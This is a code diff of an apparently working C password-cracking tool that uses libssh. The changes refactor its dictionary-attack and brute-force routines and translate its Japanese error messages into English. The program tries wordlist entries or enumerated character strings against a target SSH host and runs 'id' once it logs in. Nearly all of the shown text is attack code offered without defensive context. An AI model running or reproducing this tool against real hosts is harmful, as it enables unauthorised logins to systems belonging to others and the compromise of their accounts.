@@ -33,24 +33,20 @@ int show_remote_processes(ssh_session session) {
     int nbytes, rc;
     char buffer[256];
     
-    channel = ssh_channel_new(session);
-    if (channel == NULL) return SSH_ERROR;
+    if ((channel = ssh_channel_new(session)) == NULL) return SSH_ERROR;
     
-    rc = ssh_channel_open_session(channel);
-    if (rc != SSH_OK) {
+    if ((rc = ssh_channel_open_session(channel)) != SSH_OK) {
         ssh_channel_free(channel);
         return rc;
     }
     
-    rc = ssh_channel_request_exec(channel, "id");
-    if (rc != SSH_OK) {
+    if ((rc = ssh_channel_request_exec(channel, "id")) != SSH_OK) {
         ssh_channel_close(channel);
         ssh_channel_free(channel);
         return rc;
     }
     
-    nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
-    while (nbytes > 0) {
+    while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
         if (write(1, buffer, nbytes) != (unsigned int) nbytes) {
             ssh_channel_close(channel);
             ssh_channel_free(channel);
@@ -74,24 +70,17 @@ int show_remote_processes(ssh_session session) {
 
 //ssh接続
 int ssh_main_connection(char host[], char name[], int port, char password[]) {
-    char ip[strlen(host) + 1];
-    char user[strlen(name) + 1];
     char key[strlen(password) + 1];
     int rc;
     size_t i;
     ssh_session my_ssh_session = ssh_new();
     
-    if (my_ssh_session == NULL) {
-        return 1;
-    }
-    else {
-        for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
-        for (i = 0; i <= strlen(host); i++) ip[i] = host[i];
-        for (i = 0; i <= strlen(name); i++) user[i] = name[i];
-    }
+    if (my_ssh_session == NULL) return 1;
+
+    for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
     
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, ip);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, user);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, name);
     ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
     ssh_options_set(my_ssh_session, SSH_OPTIONS_CIPHERS_C_S, "aes128-ctr");
     
@@ -111,7 +100,7 @@ int ssh_main_connection(char host[], char name[], int port, char password[]) {
     }
     
     if ((rc = show_remote_processes(my_ssh_session)) != SSH_OK) {
-        printf("Error: コマンドの実行が出来なかったお\n");
+        printf("Error: Could not execute the command.\n");
         ssh_free(my_ssh_session);
         return 1;
     }
@@ -123,8 +112,12 @@ int ssh_main_connection(char host[], char name[], int port, char password[]) {
 
 //辞書攻撃
 void dictionary_attack(char host[], char name[], int *port) {
+    int (*p_func)(char*, char*, int, char*) = &ssh_main_connection;
+    char ip[strlen(host) + 1];
+    char user[strlen(name) + 1];
     char filename[256], str[MAXLEN] = {0};
-    //int i;
+    int logical = -1;
+    size_t i;
     if (port == NULL) {
         printf("Error: port is NULL\n");
         exit(1);
@@ -139,11 +132,17 @@ void dictionary_attack(char host[], char name[], int *port) {
         exit(1);
     }
     printf("\nAnalyzing %s password...\n", host);
+    for (i = 0; i <= strlen(host); i++) ip[i] = host[i];
+    for (i = 0; i <= strlen(name); i++) user[i] = name[i];
     while (fgets(str, MAXLEN, fp) != NULL) {
         str[strcspn(str, "\n")] = 0;
-        if (ssh_main_connection(host, name, *port, str) == 0) {
+        if ((*p_func)(ip, user, *port, str) == 0) {
+            logical = 1;
             break;
         }
+    }
+    if (logical != 1) {
+        printf("\nPassword not found :(\n");
     }
     fclose(fp);
     return;
@@ -151,18 +150,24 @@ void dictionary_attack(char host[], char name[], int *port) {
 
 //総当たり攻撃
 void brute_force_attack(char host[], char name[], int *port) {
+    int (*p_func)(char*, char*, int, char*) = &ssh_main_connection;
     const char *x = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\')(-=^~|[{@`]}:*;+_\\/.,>< ";
+    char ip[strlen(host) + 1];
+    char user[strlen(name) + 1];
     char str[MAXLEN + 1] = {0};
     int index[MAXLEN + 1] = {0};
     int i, carry;
+    size_t j;
+    for (j = 0; j <= strlen(host); j++) ip[j] = host[j];
+    for (j = 0; j <= strlen(name); j++) user[j] = name[j];
     do {
-        if (ssh_main_connection(host, name, *port, str) == 0) {
+        if ((*p_func)(ip, user, *port, str) == 0) {
             break;
         }
         for(i = 0, index[i]++, carry = !0; carry; i++) {
             carry = index[i] >= strlen(x);
             if (carry) {
-                index[i + 1]++;
+                index[i+1]++;
                 index[i] = 1;
             }
             str[i] = x[index[i]];
@@ -182,7 +187,7 @@ int main(int argc, char* argv[]) {
     
     port = atoi(argv[4]);
     if (port < 0 || port > 65535) {
-        printf("Error: short型って知ってる?\n");
+        printf("Error: Do you know what a short type is?\n");
         return 1;
     }
     
@@ -205,7 +210,7 @@ int main(int argc, char* argv[]) {
         dictionary_attack(argv[2], argv[6], &port);
         break;
     default:
-        printf("Error: 整数って知ってる?\n");
+        printf("Error: Do you know what an integer is?\n");
         return 1;
         break;
     }
